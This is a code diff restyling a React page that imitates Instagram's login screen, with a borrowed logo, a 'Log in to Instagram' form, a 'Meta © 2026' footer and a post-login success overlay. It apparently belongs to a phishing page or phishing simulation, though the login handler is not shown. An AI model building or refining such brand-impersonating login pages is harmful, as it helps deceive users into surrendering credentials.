@@ -35,35 +35,37 @@ export default function InstagramLoginPage() {
       </Head>
 
       <style jsx>{`
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        a { text-decoration: none; }
-        main { height: 100vh; width: 100%; background-color: #fafafa; display: flex; align-items: center; justify-content: center; }
-        #forma { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 40px; padding-bottom: 20px; background-color: #fff; margin: auto; position: relative; }
-        .form-group { position: relative; margin: 15px 0; }
-        .form-group input { width: 100%; background: none; border: none; outline: none; font-size: 13px; color: #6b6b6b; padding: 10px; border-bottom: 1px solid #c4c4c4; }
-        .field-icon { position: absolute; right: 10px; top: 10px; color: rgb(65, 65, 65); font-size: 13px; cursor: pointer; }
-        button { width: 100%; border: 1px solid #1e71ec; background-color: #1e71ec; color: white; font-size: 13px; font-weight: 500; padding: 12px 5px; border-radius: 5px; cursor: pointer; }
-        button:hover { background-color: #145bb8; }
-        .orr { position: relative; text-align: center; margin: 20px 0; }
-        .orr p { padding-bottom: 0; margin-bottom: 0; font-weight: 600; font-size: 13px; color: rgb(109, 109, 109); }
-        .orr::after, .orr::before { content: ""; position: absolute; height: 1px; background-color: #dadada; }
-        .orr::after { width: 40%; top: calc(50% - 0.5px); left: 0; }
-        .orr::before { width: 40%; top: calc(50% - 0.5px); right: 0; }
-        .sign-up { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 20px; background-color: #fff; margin: auto; margin-top: 15px; }
-        footer p { margin-top: 20px; color: #848585; font-size: 13px; }
-        .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; }
-        .success-overlay.show { display: flex; }
-        .success-box { max-width: 440px; width: 100%; text-align: center; }
-        .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        .checkmark svg { width: 56px; height: 56px; }
-        .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
-        @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
-        @keyframes draw-check { to { stroke-dashoffset: 0; } }
-        @media (max-width: 450px) { #forma { background-color: transparent; border: none; } .sign-up { background-color: transparent; border: none; } }
+              * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+              a { text-decoration: none; }
+              main { height: 100vh; width: 100%; background-color: #fafafa; display: flex; align-items: center; justify-content: center; }
+              #forma { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 40px; padding-bottom: 20px; background-color: #fff; margin: auto; position: relative; }
+              .logo { width: 96px; height: 96px; margin: 0 auto 24px; display: block; }
+              .form-group { position: relative; margin: 15px 0; }
+              .form-group input { width: 100%; background: #fafafa; border: 1px solid #ddd; border-radius: 6px; padding: 12px 16px; outline: none; font-size: 15px; color: #262626; }
+              .form-group input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2); }
+              .field-icon { position: absolute; right: 12px; top: 12px; color: #888; font-size: 13px; cursor: pointer; }
+              button { width: 100%; border: 1px solid #1877f2; background-color: #1877f2; color: white; font-size: 15px; font-weight: 500; padding: 12px 5px; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
+              button:hover { background-color: #166fe5; }
+              .orr { position: relative; text-align: center; margin: 20px 0; }
+              .orr p { padding-bottom: 0; margin-bottom: 0; font-weight: 600; font-size: 13px; color: rgb(109, 109, 109); }
+              .orr::after, .orr::before { content: ""; position: absolute; height: 1px; background-color: #dadada; }
+              .orr::after { width: 40%; top: calc(50% - 0.5px); left: 0; }
+              .orr::before { width: 40%; top: calc(50% - 0.5px); right: 0; }
+              .sign-up { width: 350px; text-align: center; border: 1px solid #c9c9c9; padding: 20px; background-color: #fff; margin: auto; margin-top: 15px; }
+              footer p { margin-top: 20px; color: #848585; font-size: 13px; }
+              .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; }
+              .success-overlay.show { display: flex; }
+              .success-box { max-width: 440px; width: 100%; text-align: center; }
+              .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+              .checkmark svg { width: 56px; height: 56px; }
+              .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
+              @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
+              @keyframes draw-check { to { stroke-dashoffset: 0; } }
+              @media (max-width: 450px) { #forma { background-color: transparent; border: none; padding: 20px; } .sign-up { background-color: transparent; border: none; padding: 20px; } .logo { width: 64px; height: 64px; } }
       `}</style>
 
       <main>
-        <div className="login-wrapper">
+        <div>
           <img className="logo" src="/logos/ig.png" alt="Instagram" />
           <div id="forma">
             <h1 style={{fontSize: '1.75rem', fontWeight: 700, marginBottom: '8px', color: '#262626'}}>Log in to Instagram</h1>
@@ -81,11 +83,16 @@ export default function InstagramLoginPage() {
             <button id="login" type="submit" onClick={handleLogin}>Log In</button>
 
             <div id="alert-message" style={{color: 'rgb(244, 67, 54)'}}>{feedback}</div>
-          </div>
-        </div>
 
-        <div className="sign-up"><p>Don't have an account? Sign up</p></div>
-        <p className="footer">Meta © 2026</p>
+            <div className="orr"><p>OR</p></div>
+
+            <a href="#" style={{display: 'block', marginBottom: '12px', fontSize: '13px', color: 'rgb(85, 85, 85)'}}>Forgot password?</a>
+          </div>
+
+          <div className="sign-up"><p>Don't have an account? Sign up</p></div>
+
+          <p className="footer">Meta © 2026</p>
+        </div>
       </main>
 
       <div className="success-overlay" id="successOverlay" aria-hidden="true">
